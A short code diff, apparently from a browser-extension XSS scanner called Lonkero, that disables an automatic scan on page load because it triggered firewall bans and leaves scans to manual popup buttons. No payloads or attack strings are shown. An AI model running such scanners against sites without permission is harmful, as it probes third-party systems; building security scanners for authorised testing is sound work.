-  // Auto-scan ALWAYS runs on page load (quick scan for discovery)
+  // AUTO-SCAN DISABLED - triggers WAF bans
+  // Scans are now triggered manually via popup buttons
+  // To enable auto-scan, uncomment the block below
+  /*
   setTimeout(() => {
     const runAutoScan = () => {
-      // Run quick scan which includes discovery
       console.log('[XSS Scanner] Auto-scanning page...');
       xssScanner.quickScan().then(results => {
         if (results.length > 0) {
@@ -2490,6 +3093,7 @@
       window.addEventListener('load', runAutoScan);
     }
   }, 1500);
+  */
 
   console.log('[Lonkero] XSS Scanner v2.5 loaded.');
   console.log('  xssScanner.quickScan()  - Fast scan (current page)');
